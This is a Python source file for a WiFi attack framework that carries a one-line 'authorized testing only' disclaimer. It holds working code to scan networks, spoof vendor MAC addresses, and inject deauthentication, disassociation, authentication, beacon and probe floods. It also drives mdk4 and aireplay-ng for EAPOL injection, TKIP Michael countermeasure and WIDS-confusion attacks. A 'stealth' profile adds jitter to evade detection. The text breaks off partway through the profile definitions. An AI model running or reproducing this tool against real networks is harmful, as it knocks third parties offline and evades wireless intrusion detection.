#!/usr/bin/env python3
"""
Rasberry-Liez — Multi-vector WiFi auditing framework.
Merges rasberry-lie scripts + mdk4 + scapy raw injection.
For authorized security testing only.
"""

import subprocess
import time
import random
import os
import re
import csv
import logging
import signal
import sys
import argparse
import threading
import tempfile
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s [%(levelname)s] %(message)s')
log = logging.getLogger("rasberryliez")

# ---------------------------------------------------------------------------
# Common vendor OUIs for realistic MAC generation
# ---------------------------------------------------------------------------
VENDOR_OUIS = [
    "3C:22:FB", "9C:B6:D0", "F0:18:98", "A4:83:E7", "28:6A:BA",
    "DC:2B:2A", "F0:D1:A9", "78:7B:8A", "AC:BC:32", "14:7D:DA",
    "6C:96:CF", "C8:69:CD", "A8:66:7F", "D0:81:7A", "38:F9:D3",
    "00:25:00", "8C:88:2B", "50:EB:F6", "CC:07:AB", "78:BD:BC",
    "94:35:0A", "E4:B0:21", "10:D5:42", "C0:BD:D1", "A0:82:1F",
    "3C:5A:B4", "54:60:09", "F4:F5:D8", "A4:77:33", "48:D6:D5",
    "F8:0F:F9", "94:EB:2C",
    "F8:1A:67", "00:17:C4", "94:65:2D", "68:17:29", "8C:8D:28",
    "48:51:B7", "34:CF:F6", "80:86:F2", "A0:C5:89", "7C:76:35",
    "00:24:D7", "2C:D0:5A", "D8:C7:71", "00:03:7F", "1C:4B:D6",
    "00:E0:4C", "48:5B:39", "80:9F:AB", "00:0A:EB",
    "88:53:D4", "CC:A2:23", "04:F9:38", "E0:19:1D", "34:29:12",
    "70:8A:09", "24:09:95",
    "28:6C:07", "64:CC:2E", "78:02:F8", "F8:A4:5F", "9C:99:A0",
    "C0:EE:40",
    "FC:0F:E6", "04:5D:4B", "AC:9B:0A",
    "10:68:3F", "A8:16:B2", "CC:FA:00",
    "E8:B4:C8", "EC:F2:36", "68:C4:4D",
    "28:18:78", "7C:1E:52", "C8:3F:26",
    "E8:48:B8", "AC:84:C6", "00:14:BF", "50:C7:BF", "B0:4E:26",
    "00:1F:33", "30:B5:C2", "20:AA:4B", "A4:2B:8C",
    "00:1E:58", "BC:F5:AC", "00:21:5C",
    "DC:A6:32", "B8:27:EB", "E4:5F:01", "28:CD:C1",
    "F0:D2:F1", "74:C2:46", "A0:02:DC", "FC:65:DE",
    "B8:3E:59", "DC:56:E7", "B8:E9:37",
]


def random_mac_full() -> str:
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(5))


def random_mac_vendor() -> str:
    oui = random.choice(VENDOR_OUIS)
    return oui + ":%02x:%02x:%02x" % tuple(random.randint(0, 255) for _ in range(3))


def random_mac(vendor=False) -> str:
    return random_mac_vendor() if vendor else random_mac_full()


# ---------------------------------------------------------------------------
# Shell helper
# ---------------------------------------------------------------------------
def run(cmd, check=True, timeout=None, capture=True):
    try:
        log.debug(f"exec: {' '.join(cmd)}")
        r = subprocess.run(cmd, capture_output=capture, text=True, check=check, timeout=timeout)
        if r.stderr and r.stderr.strip():
            log.debug(f"stderr: {r.stderr.strip()}")
        return r
    except subprocess.CalledProcessError as e:
        log.error(f"'{' '.join(e.cmd)}' failed ({e.returncode}): {e.stderr.strip() if e.stderr else ''}")
        return None
    except subprocess.TimeoutExpired:
        log.warning(f"'{' '.join(cmd)}' timed out ({timeout}s)")
        return None
    except Exception as e:
        log.error(f"exec error: {e}", exc_info=True)
        return None


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
@dataclass
class Network:
    essid: str
    bssid: str
    channel: int
    power: int = -100
    encryption: str = ""
    wps: str = ""
    clients: list = field(default_factory=list)

    def __hash__(self):
        return hash(self.bssid)


@dataclass
class AttackStats:
    started: float = field(default_factory=time.time)
    deauths_sent: int = 0
    disassocs_sent: int = 0
    beacons_sent: int = 0
    auth_floods: int = 0
    eapol_floods: int = 0
    michael_attacks: int = 0
    wids_attacks: int = 0
    probe_floods: int = 0
    fakeauths: int = 0
    macs_used: int = 0
    aps_targeted: int = 0
    cycles: int = 0
    monitor_recoveries: int = 0
    errors: int = 0
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def inc(self, attr, n=1):
        with self._lock:
            setattr(self, attr, getattr(self, attr) + n)

    def summary(self) -> str:
        elapsed = time.time() - self.started
        m, s = divmod(int(elapsed), 60)
        h, m = divmod(m, 60)
        return (
            f"--- Session Stats ({h:02d}:{m:02d}:{s:02d}) ---\n"
            f"  Cycles: {self.cycles} | APs targeted: {self.aps_targeted}\n"
            f"  Deauths: {self.deauths_sent} | Disassocs: {self.disassocs_sent}\n"
            f"  Auth floods: {self.auth_floods} | EAPOL: {self.eapol_floods}\n"
            f"  Beacons: {self.beacons_sent} | Probes: {self.probe_floods}\n"
            f"  Michael: {self.michael_attacks} | WIDS: {self.wids_attacks}\n"
            f"  Fakeauths: {self.fakeauths}\n"
            f"  Spoofed MACs: {self.macs_used} | Monitor recoveries: {self.monitor_recoveries}\n"
            f"  Errors: {self.errors}"
        )


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------
class Scanner:
    def __init__(self, interface: str, scan_time: int = 5):
        self.iface = interface
        self.scan_time = scan_time

    def scan_airodump(self) -> list[Network]:
        tmpdir = tempfile.mkdtemp(prefix="rbliez_")
        prefix = os.path.join(tmpdir, "scan")
        csv_file = prefix + "-01.csv"
        proc = None
        try:
            proc = subprocess.Popen(
                ['airodump-ng', '--write', prefix, '--output-format', 'csv',
                 '--write-interval', '1', '--wps', '--band', 'abg', self.iface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            time.sleep(self.scan_time)
            proc.send_signal(signal.SIGINT)
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=3)
        except Exception as e:
            log.warning(f"airodump-ng failed to run: {e}")
            if proc:
                try:
                    proc.kill()
                except Exception:
                    pass
            self._cleanup_tmp(tmpdir)
            return self.scan_iwlist()

        if not os.path.exists(csv_file):
            log.warning("airodump CSV not created, falling back to iwlist.")
            self._cleanup_tmp(tmpdir)
            return self.scan_iwlist()

        try:
            with open(csv_file, 'r', errors='replace') as f:
                content = f.read()
        except Exception:
            self._cleanup_tmp(tmpdir)
            return self.scan_iwlist()

        networks = []
        clients_by_bssid: dict[str, list[str]] = {}
        sections = content.split("\r\n\r\n")

        if len(sections) >= 1:
            ap_section = sections[0].strip()
            if ap_section:
                lines = ap_section.splitlines()
                if len(lines) > 1:
                    reader = csv.reader(lines[1:])
                    for row in reader:
                        if len(row) < 14:
                            continue
                        bssid = row[0].strip()
                        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                            continue
                        try:
                            ch = int(row[3].strip())
                        except (ValueError, IndexError):
                            continue
                        try:
                            pwr = int(row[8].strip())
                        except (ValueError, IndexError):
                            pwr = -100
                        enc = row[5].strip() if len(row) > 5 else ""
                        essid = row[13].strip() if len(row) > 13 else ""
                        wps = row[14].strip() if len(row) > 14 else ""
                        if essid and essid != "<length:  0>":
                            networks.append(Network(
                                essid=essid, bssid=bssid.upper(), channel=ch,
                                power=pwr, encryption=enc, wps=wps,
                            ))

        if len(sections) >= 2:
            cl_section = sections[1].strip()
            if cl_section:
                lines = cl_section.splitlines()
                if len(lines) > 1:
                    reader = csv.reader(lines[1:])
                    for row in reader:
                        if len(row) < 6:
                            continue
                        client_mac = row[0].strip()
                        ap_bssid = row[5].strip() if len(row) > 5 else ""
                        if not ap_bssid:
                            continue
                        clients_by_bssid.setdefault(ap_bssid.upper(), []).append(client_mac)

        for net in networks:
            net.clients = clients_by_bssid.get(net.bssid, [])

        self._cleanup_tmp(tmpdir)
        seen = set()
        deduped = []
        for n in networks:
            if n.bssid not in seen:
                seen.add(n.bssid)
                deduped.append(n)
        log.info(f"airodump scan: {len(deduped)} networks, "
                 f"{sum(len(n.clients) for n in deduped)} clients")
        return deduped

    def scan_iwlist(self) -> list[Network]:
        log.info(f"Scanning with iwlist on {self.iface}...")
        run(['ifconfig', self.iface, 'up'], check=False)
        time.sleep(0.5)
        proc = run(['iwlist', self.iface, 'scan'], check=False)
        networks = []
        if not proc or not proc.stdout:
            return networks

        seen = set()
        for cell in proc.stdout.split("Cell ")[1:]:
            bssid_m = re.search(r"Address:\s*(([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2})", cell)
            chan_m = re.search(r"Channel:(\d+)", cell) or \
                     re.search(r"Frequency:[\d.]+ GHz \(Channel (\d+)\)", cell)
            essid_m = re.search(r'ESSID:"([^"]+)"', cell)
            pwr_m = re.search(r"Signal level[=:](-?\d+)", cell)
            wpa_m = re.search(r"(WPA2?|WPA3)", cell)
            enc_m = re.search(r"Encryption key:(\w+)", cell)

            if bssid_m and chan_m and essid_m:
                bssid = bssid_m.group(1).upper()
                ch = int(chan_m.group(1))
                essid = essid_m.group(1)
                pwr = int(pwr_m.group(1)) if pwr_m else -100
                enc = wpa_m.group(1) if wpa_m else ("WEP" if enc_m and enc_m.group(1) == "on" else "OPN")
                if essid.strip() and essid != "<hidden>" and bssid not in seen:
                    seen.add(bssid)
                    networks.append(Network(essid=essid, bssid=bssid, channel=ch,
                                            power=pwr, encryption=enc))
        log.info(f"iwlist scan: {len(networks)} networks")
        return networks

    @staticmethod
    def _cleanup_tmp(tmpdir):
        try:
            for f in Path(tmpdir).iterdir():
                f.unlink()
            Path(tmpdir).rmdir()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# MAC Manager
# ---------------------------------------------------------------------------
class MACManager:
    def __init__(self, enabled=True, vendor_mode=False, pool_size=0):
        self.enabled = enabled
        self.vendor_mode = vendor_mode
        self.pool: list[str] = []
        self._pool_idx = 0
        self._lock = threading.Lock()
        self._generated = 0
        if pool_size > 0:
            self.pool = [random_mac(vendor=vendor_mode) for _ in range(pool_size)]

    def next_mac(self) -> str:
        if not self.enabled:
            return ""
        with self._lock:
            self._generated += 1
            if self.pool:
                mac = self.pool[self._pool_idx % len(self.pool)]
                self._pool_idx += 1
                return mac
            return random_mac(vendor=self.vendor_mode)

    @property
    def count(self):
        return self._generated


# ---------------------------------------------------------------------------
# Interface manager with monitor mode watchdog
# ---------------------------------------------------------------------------
class InterfaceManager:
    def __init__(self, phy: str, mon: str, use_airmon: bool, mac_mgr: MACManager):
        self.phy = phy
        self.mon = mon
        self.use_airmon = use_airmon
        self.mac_mgr = mac_mgr
        self.original_mac = None
        self._lock = threading.Lock()
        self.vifs: list[str] = []
        self._killed_services: list[str] = []

    def check_exists(self):
        if not os.path.exists(f"/sys/class/net/{self.phy}"):
            log.error(f"Interface {self.phy} not found.")
            sys.exit(1)

    def get_permanent_mac(self):
        run(['ifconfig', self.phy, 'up'], check=False)
        time.sleep(0.3)
        out = run(['macchanger', '-s', self.phy], check=False)
        if out and out.stdout:
            m = re.search(r"Permanent MAC:\s*([0-9a-fA-F:]{17})", out.stdout, re.IGNORECASE)
            if m:
                return m.group(1)
        out = run(['ip', 'link', 'show', self.phy], check=False)
        if out and out.stdout:
            m = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", out.stdout, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def _set_interface_raw(self, iface, mode, mac=None, bring_up=True):
        run(['ifconfig', iface, 'down'], check=False)
        time.sleep(0.1)
        if self.mac_mgr.enabled and mac:
            if mac == "perm":
                if self.original_mac:
                    run(['macchanger', '-m', self.original_mac, iface], check=False)
                else:
                    run(['macchanger', '-p', iface], check=False)
            else:
                run(['macchanger', '-m', mac, iface], check=False)
        time.sleep(0.1)
        run(['iwconfig', iface, 'mode', mode], check=False)
        time.sleep(0.1)
        if bring_up:
            run(['ifconfig', iface, 'up'], check=False)
        time.sleep(0.3)

    def set_interface(self, iface, mode, mac=None, bring_up=True):
        with self._lock:
            self._set_interface_raw(iface, mode, mac=mac, bring_up=bring_up)

    def start_monitor(self):
        if self.use_airmon:
            log.info(f"Starting monitor mode on {self.phy} via airmon-ng...")
            check_result = run(['airmon-ng', 'check', 'kill'], check=False)
            if check_result and check_result.stdout:
                for svc in ['NetworkManager', 'wpa_supplicant', 'dhclient']:
                    if svc.lower() in check_result.stdout.lower():
                        self._killed_services.append(svc)
            result = run(['airmon-ng', 'start', self.phy], check=False)
            if result and result.stdout:
                m = re.search(r'\(monitor mode.*enabled on (\w+)\)', result.stdout) or \
                    re.search(r'monitor mode.*vif.*enabled.*?(\w+mon\w*)', result.stdout)
                if m:
                    detected = m.group(1)
                    if detected != self.mon:
                        log.info(f"Auto-detected monitor interface: {detected}")
                        self.mon = detected
        else:
            mac = self.mac_mgr.next_mac() if self.mac_mgr.enabled else None
            self._set_interface_raw(self.mon, "monitor", mac=mac)

        if not os.path.exists(f"/sys/class/net/{self.mon}"):
            log.warning(f"Monitor interface {self.mon} not found in /sys. Proceeding anyway.")
        log.info(f"Monitor interface: {self.mon}")

    def stop_monitor(self):
        self.destroy_vifs()
        if self.use_airmon:
            log.info(f"Stopping monitor mode via airmon-ng...")
            run(['airmon-ng', 'stop', self.mon], check=False)
            target = self.phy
        else:
            target = self.mon
        self._set_interface_raw(target, "managed", mac="perm")
        run(['ifconfig', self.phy, 'up'], check=False)
        log.info(f"Interface {self.phy} restored to managed mode.")

        for svc in self._killed_services:
            log.info(f"Restarting service: {svc}")
            run(['systemctl', 'start', svc], check=False)
        if self._killed_services:
            log.info(f"Restarted services: {', '.join(self._killed_services)}")
        self._killed_services.clear()

    def is_monitor(self) -> bool:
        if not os.path.exists(f"/sys/class/net/{self.mon}"):
            return False
        out = run(['iwconfig', self.mon], check=False)
        if out and out.stdout and 'Mode:Monitor' in out.stdout:
            return True
        return False

    def ensure_monitor(self, stats: 'AttackStats') -> bool:
        if self.is_monitor():
            return True
        log.warning(f"Monitor mode lost on {self.mon} — recovering...")
        stats.inc("monitor_recoveries")
        try:
            if self.use_airmon:
                run(['airmon-ng', 'stop', self.mon], check=False)
                time.sleep(0.5)
                run(['airmon-ng', 'check', 'kill'], check=False)
                result = run(['airmon-ng', 'start', self.phy], check=False)
                if result and result.stdout:
                    m = re.search(r'\(monitor mode.*enabled on (\w+)\)', result.stdout) or \
                        re.search(r'monitor mode.*vif.*enabled.*?(\w+mon\w*)', result.stdout)
                    if m:
                        self.mon = m.group(1)
            else:
                self._set_interface_raw(self.mon, "monitor",
                                        mac=self.mac_mgr.next_mac() if self.mac_mgr.enabled else None)
            time.sleep(0.5)
            ok = self.is_monitor()
            if ok:
                log.info(f"Monitor mode recovered on {self.mon}.")
            else:
                log.error(f"Failed to recover monitor mode on {self.mon}.")
            return ok
        except Exception as e:
            log.error(f"Monitor recovery failed: {e}", exc_info=True)
            return False

    def set_channel(self, iface, channel) -> bool:
        with self._lock:
            run(['ifconfig', iface, 'down'], check=False)
            time.sleep(0.1)
            run(['iwconfig', iface, 'channel', str(channel)], check=False)
            time.sleep(0.1)
            run(['ifconfig', iface, 'up'], check=False)
            time.sleep(0.2)
            verify = run(['iwconfig', iface], check=False)
            if verify and verify.stdout:
                m = re.search(r"Channel[=:](\d+)", verify.stdout) or \
                    re.search(r"Frequency:[\d.]+ GHz \(Channel (\d+)\)", verify.stdout)
                if m and m.group(1) == str(channel):
                    return True
            log.warning(f"Channel {channel} verify failed on {iface}, proceeding anyway.")
            return True

    def create_vif(self, name: str) -> bool:
        result = run(['iw', 'dev', self.mon, 'interface', 'add', name,
                      'type', 'monitor'], check=False)
        if result and result.returncode == 0:
            mac = self.mac_mgr.next_mac()
            if mac:
                run(['ifconfig', name, 'down'], check=False)
                run(['macchanger', '-m', mac, name], check=False)
            run(['ifconfig', name, 'up'], check=False)
            self.vifs.append(name)
            log.info(f"Created virtual interface {name} (MAC: {mac or 'default'})")
            return True
        log.warning(f"Failed to create virtual interface {name}")
        return False

    def destroy_vifs(self):
        for vif in list(self.vifs):
            run(['iw', 'dev', vif, 'del'], check=False)
        self.vifs.clear()

    def spoof_and_up(self, iface) -> str:
        mac = self.mac_mgr.next_mac()
        if mac:
            run(['ifconfig', iface, 'down'], check=False)
            run(['macchanger', '-m', mac, iface], check=False)
            run(['ifconfig', iface, 'up'], check=False)
            time.sleep(0.2)
        return mac


# ---------------------------------------------------------------------------
# Firewall manager
# ---------------------------------------------------------------------------
class Firewall:
    def __init__(self, iface: str, block_traffic=True, block_icmp=True, scoped=True):
        self.iface = iface
        self.block_traffic = block_traffic
        self.block_icmp = block_icmp
        self.scoped = scoped
        self._traffic_applied = False
        self._icmp_applied = False

    def engage(self):
        if self.block_traffic:
            iflag = ['-i', self.iface] if self.scoped else []
            log.info(f"Blocking incoming traffic{' on ' + self.iface if self.scoped else ''}.")
            subprocess.call(['iptables', '-I', 'INPUT'] + iflag + ['-j', 'DROP'])
            subprocess.call(['iptables', '-I', 'FORWARD'] + iflag + ['-j', 'DROP'])
            self._traffic_applied = True
        if self.block_icmp:
            log.info("Blocking ICMP timestamp/address-mask requests.")
            subprocess.call(['iptables', '-I', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'])
            subprocess.call(['iptables', '-I', 'INPUT', '-p', 'icmp', '--icmp-type', '17', '-j', 'DROP'])
            self._icmp_applied = True

    def disengage(self):
        if self._traffic_applied:
            iflag = ['-i', self.iface] if self.scoped else []
            subprocess.call(['iptables', '-D', 'INPUT'] + iflag + ['-j', 'DROP'])
            subprocess.call(['iptables', '-D', 'FORWARD'] + iflag + ['-j', 'DROP'])
            self._traffic_applied = False
            log.info("Removed traffic block.")
        if self._icmp_applied:
            subprocess.call(['iptables', '-D', 'INPUT', '-p', 'icmp', '--icmp-type', '13', '-j', 'DROP'])
            subprocess.call(['iptables', '-D', 'INPUT', '-p', 'icmp', '--icmp-type', '17', '-j', 'DROP'])
            self._icmp_applied = False
            log.info("Removed ICMP block.")


# ---------------------------------------------------------------------------
# Attack modules
# ---------------------------------------------------------------------------

ALL_ATTACK_LIST = [
    "deauth", "disassoc", "auth-flood", "beacon-flood",
    "probe-flood", "aireplay", "mdk4-deauth", "eapol",
    "michael", "wids", "fakeauth",
]

SCAPY_ATTACKS = {"deauth", "disassoc", "auth-flood", "beacon-flood", "probe-flood"}
TOOL_ATTACKS = {"aireplay", "fakeauth", "mdk4-deauth", "eapol", "michael", "wids"}


class Attacks:
    def __init__(self, ifmgr: InterfaceManager, mac_mgr: MACManager,
                 stats: AttackStats, cfg: dict):
        self.ifmgr = ifmgr
        self.mac_mgr = mac_mgr
        self.stats = stats
        self.cfg = cfg
        self._scapy_loaded = False
        self._sendp = None
        self._RadioTap = None
        self._Dot11 = None
        self._Dot11Deauth = None
        self._Dot11Disas = None
        self._Dot11Auth = None
        self._Dot11ProbeReq = None
        self._Dot11Elt = None
        self._Dot11Beacon = None
        self._tool_lock = threading.Lock()

    def _ensure_scapy(self):
        if self._scapy_loaded:
            return True
        try:
            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
            from scapy.all import (sendp, RadioTap, Dot11, Dot11Deauth,
                                   Dot11Disas, Dot11Auth, Dot11ProbeReq,
                                   Dot11Elt, Dot11Beacon)
            self._sendp = sendp
            self._RadioTap = RadioTap
            self._Dot11 = Dot11
            self._Dot11Deauth = Dot11Deauth
            self._Dot11Disas = Dot11Disas
            self._Dot11Auth = Dot11Auth
            self._Dot11ProbeReq = Dot11ProbeReq
            self._Dot11Elt = Dot11Elt
            self._Dot11Beacon = Dot11Beacon
            self._scapy_loaded = True
            return True
        except ImportError:
            log.error("scapy not available — raw injection attacks disabled.")
            return False

    def _scapy_send(self, pkts, iface, count, inter=0.001):
        try:
            self._sendp(pkts, iface=iface, count=count, inter=inter, verbose=False)
        except OSError as e:
            if "Network is down" in str(e) or "No such device" in str(e):
                log.warning(f"Interface {iface} went down during send — monitor may need recovery.")
            else:
                log.error(f"scapy send error: {e}")
        except Exception as e:
            log.error(f"scapy send error: {e}")

    # -- Scapy attacks (truly parallel-safe, no interface mode changes) --

    def scapy_deauth(self, net: Network, count=64, sources=4, reason=7):
        if not self._ensure_scapy():
            return self.aireplay_deauth(net)

        self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
        targets = net.clients if net.clients else [self.cfg["target_client_mac"]]
        pkts = []

        for _ in range(sources):
            src = self.mac_mgr.next_mac()
            self.stats.inc("macs_used")
            for client in targets:
                dst = client if client != "FF:FF:FF:FF:FF:FF" else "FF:FF:FF:FF:FF:FF"
                pkts.append(self._RadioTap() /
                            self._Dot11(addr1=dst, addr2=net.bssid, addr3=net.bssid) /
                            self._Dot11Deauth(reason=reason))
                pkts.append(self._RadioTap() /
                            self._Dot11(addr1=net.bssid, addr2=src, addr3=net.bssid) /
                            self._Dot11Deauth(reason=reason))

        total = count * len(pkts)
        log.info(f"[scapy-deauth] {net.essid} ({net.bssid}) ch{net.channel} "
                 f"— {sources}src x {len(targets)}tgt x {count}rnd = {total} frames")
        self._scapy_send(pkts, self.ifmgr.mon, count)
        self.stats.inc("deauths_sent", total)

    def scapy_disassoc(self, net: Network, count=64, sources=4, reason=8):
        if not self._ensure_scapy():
            return

        self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
        targets = net.clients if net.clients else [self.cfg["target_client_mac"]]
        pkts = []

        for _ in range(sources):
            src = self.mac_mgr.next_mac()
            self.stats.inc("macs_used")
            for client in targets:
                dst = client if client != "FF:FF:FF:FF:FF:FF" else "FF:FF:FF:FF:FF:FF"
                pkts.append(self._RadioTap() /
                            self._Dot11(addr1=dst, addr2=net.bssid, addr3=net.bssid) /
                            self._Dot11Disas(reason=reason))
                pkts.append(self._RadioTap() /
                            self._Dot11(addr1=net.bssid, addr2=src, addr3=net.bssid) /
                            self._Dot11Disas(reason=reason))

        total = count * len(pkts)
        log.info(f"[scapy-disassoc] {net.essid} ({net.bssid}) — {total} frames")
        self._scapy_send(pkts, self.ifmgr.mon, count)
        self.stats.inc("disassocs_sent", total)

    def scapy_auth_flood(self, net: Network, count=128, sources=16):
        if not self._ensure_scapy():
            return

        self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
        pkts = []
        for _ in range(sources):
            src = self.mac_mgr.next_mac()
            self.stats.inc("macs_used")
            pkts.append(self._RadioTap() /
                        self._Dot11(addr1=net.bssid, addr2=src, addr3=net.bssid) /
                        self._Dot11Auth(algo=0, seqnum=1, status=0))

        total = count * len(pkts)
        log.info(f"[scapy-auth-flood] {net.essid} ({net.bssid}) — {sources} clients, {total} frames")
        self._scapy_send(pkts, self.ifmgr.mon, count)
        self.stats.inc("auth_floods", total)

    def scapy_beacon_flood(self, count=200, num_aps=30):
        if not self._ensure_scapy():
            return

        pkts = []
        for _ in range(num_aps):
            src = self.mac_mgr.next_mac()
            self.stats.inc("macs_used")
            ssid = ''.join(random.choices(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                k=random.randint(5, 20)))
            pkts.append(
                self._RadioTap() /
                self._Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",
                            addr2=src, addr3=src) /
                self._Dot11Beacon(cap='ESS+privacy') /
                self._Dot11Elt(ID='SSID', info=ssid) /
                self._Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') /
                self._Dot11Elt(ID='DSset', info=bytes([random.randint(1, 11)])))

        total = count * len(pkts)
        log.info(f"[scapy-beacon-flood] {num_aps} fake APs, {total} frames")
        self._scapy_send(pkts, self.ifmgr.mon, count, inter=0.002)
        self.stats.inc("beacons_sent", total)

    def scapy_probe_flood(self, count=100, sources=20):
        if not self._ensure_scapy():
            return

        pkts = []
        for _ in range(sources):
            src = self.mac_mgr.next_mac()
            self.stats.inc("macs_used")
            ssid = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(4, 15)))
            pkts.append(
                self._RadioTap() /
                self._Dot11(type=0, subtype=4, addr1="FF:FF:FF:FF:FF:FF",
                            addr2=src, addr3="FF:FF:FF:FF:FF:FF") /
                self._Dot11ProbeReq() /
                self._Dot11Elt(ID='SSID', info=ssid) /
                self._Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96'))

        total = count * len(pkts)
        log.info(f"[scapy-probe-flood] {sources} sources, {total} frames")
        self._scapy_send(pkts, self.ifmgr.mon, count)
        self.stats.inc("probe_floods", total)

    # -- Tool-based attacks (serialize through _tool_lock to avoid interface conflicts) --

    def aireplay_deauth(self, net: Network, duration=None):
        dur = duration or self.cfg["attack_duration_per_ap"]
        with self._tool_lock:
            mac = self.ifmgr.spoof_and_up(self.ifmgr.mon) if self.mac_mgr.enabled else None
            self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
            if mac:
                self.stats.inc("macs_used")

            packets = str(self.cfg["packets"])
            cmd = ['aireplay-ng', '-0', packets, '-a', net.bssid,
                   '-c', self.cfg["target_client_mac"], self.ifmgr.mon]
            if self.cfg.get("deauth_reason"):
                cmd.extend(['--deauth-rc', str(self.cfg["deauth_reason"])])
            timeout = dur if self.cfg["packets"] == 0 else None

            log.info(f"[aireplay-deauth] {net.essid} ({net.bssid}) ch{net.channel}")
            run(cmd, check=False, timeout=timeout)
        self.stats.inc("deauths_sent", 64)

    def aireplay_fakeauth(self, net: Network, delay=10):
        with self._tool_lock:
            mac = self.mac_mgr.next_mac() if self.mac_mgr.enabled else "00:11:22:33:44:55"
            if self.mac_mgr.enabled:
                self.ifmgr.spoof_and_up(self.ifmgr.mon)
            self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
            self.stats.inc("macs_used")

            cmd = ['aireplay-ng', '-1', str(delay), '-a', net.bssid,
                   '-h', mac, '-e', net.essid, self.ifmgr.mon]
            log.info(f"[aireplay-fakeauth] {net.essid} ({net.bssid}) as {mac}")
            run(cmd, check=False, timeout=self.cfg["attack_duration_per_ap"])
        self.stats.inc("fakeauths")

    # -- mdk4 attacks (also serialize through _tool_lock) --

    def _mdk4(self, mode, extra_args=None, duration=None):
        dur = duration or self.cfg["attack_duration_per_ap"]
        cmd = ['mdk4', self.ifmgr.mon, mode]
        if extra_args:
            cmd.extend(extra_args)
        ghost = self.cfg.get("ghost")
        if ghost:
            cmd.extend(['--ghost', ghost])
        frag = self.cfg.get("frag")
        if frag:
            cmd.extend(['--frag', frag])
        log.debug(f"mdk4 cmd: {' '.join(cmd)}")
        return run(cmd, check=False, timeout=dur)

    def mdk4_deauth(self, net: Network):
        with self._tool_lock:
            log.info(f"[mdk4-deauth] {net.essid} ({net.bssid}) ch{net.channel}")
            self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
            self._mdk4('d', ['-B', net.bssid, '-c', str(net.channel)])
        self.stats.inc("deauths_sent", 100)

    def mdk4_auth_flood(self, net: Network = None):
        with self._tool_lock:
            if net:
                log.info(f"[mdk4-auth-flood] {net.essid} ({net.bssid})")
                self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
                self._mdk4('a', ['-a', net.bssid])
            else:
                log.info("[mdk4-auth-flood] all APs")
                self._mdk4('a')
        self.stats.inc("auth_floods")

    def mdk4_beacon_flood(self):
        with self._tool_lock:
            log.info("[mdk4-beacon-flood]")
            self._mdk4('b', ['-n', 'FreeWiFi', '-a', '-m'])
        self.stats.inc("beacons_sent")

    def mdk4_eapol(self, net: Network):
        with self._tool_lock:
            log.info(f"[mdk4-eapol] {net.essid} ({net.bssid})")
            self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
            self._mdk4('e', ['-t', net.bssid])
        self.stats.inc("eapol_floods")

    def mdk4_michael(self, net: Network):
        with self._tool_lock:
            log.info(f"[mdk4-michael] {net.essid} ({net.bssid})")
            self.ifmgr.set_channel(self.ifmgr.mon, net.channel)
            self._mdk4('m', ['-t', net.bssid])
        self.stats.inc("michael_attacks")

    def mdk4_wids_confusion(self):
        with self._tool_lock:
            log.info("[mdk4-wids-confusion]")
            self._mdk4('w')
        self.stats.inc("wids_attacks")

    # -- Dispatch --

    def execute(self, mode: str, net: Network, count: int, sources: int, reason: int):
        if mode == "deauth":
            self.scapy_deauth(net, count=count, sources=sources, reason=reason)
        elif mode == "disassoc":
            self.scapy_disassoc(net, count=count, sources=sources)
        elif mode == "aireplay":
            self.aireplay_deauth(net)
        elif mode == "auth-flood":
            self.scapy_auth_flood(net, count=count, sources=sources)
        elif mode == "beacon-flood":
            self.scapy_beacon_flood(count=count)
        elif mode == "probe-flood":
            self.scapy_probe_flood(count=count, sources=sources)
        elif mode == "eapol":
            self.mdk4_eapol(net)
        elif mode == "michael":
            self.mdk4_michael(net)
        elif mode == "wids":
            self.mdk4_wids_confusion()
        elif mode == "fakeauth":
            self.aireplay_fakeauth(net)
        elif mode == "mdk4-deauth":
            self.mdk4_deauth(net)


# ---------------------------------------------------------------------------
# Attack orchestrator
# ---------------------------------------------------------------------------
ATTACK_MODES = {
    "deauth":       "Scapy multi-source deauthentication",
    "disassoc":     "Scapy multi-source disassociation",
    "aireplay":     "Classic aireplay-ng deauthentication",
    "auth-flood":   "Authentication flood (scapy)",
    "beacon-flood": "Beacon flood �� fake APs everywhere",
    "probe-flood":  "Probe request flood",
    "eapol":        "EAPOL start/logoff injection (mdk4)",
    "michael":      "Michael TKIP countermeasure exploit (mdk4)",
    "wids":         "WIDS/WIPS confusion attack (mdk4)",
    "fakeauth":     "Fake authentication to AP (aireplay-ng)",
    "mdk4-deauth":  "mdk4 deauth+disassoc (data-traffic based)",
    "all":          "All applicable attacks in parallel",
}

PROFILES = {
    "stealth": {
        "attacks": list(ALL_ATTACK_LIST),
        "sources": 3, "count": 20, "jitter": 4.0,
        "desc": "All 11 attacks, low volume, heavy jitter, vendor MACs (DEFAULT)",
    },
    "balanced": {
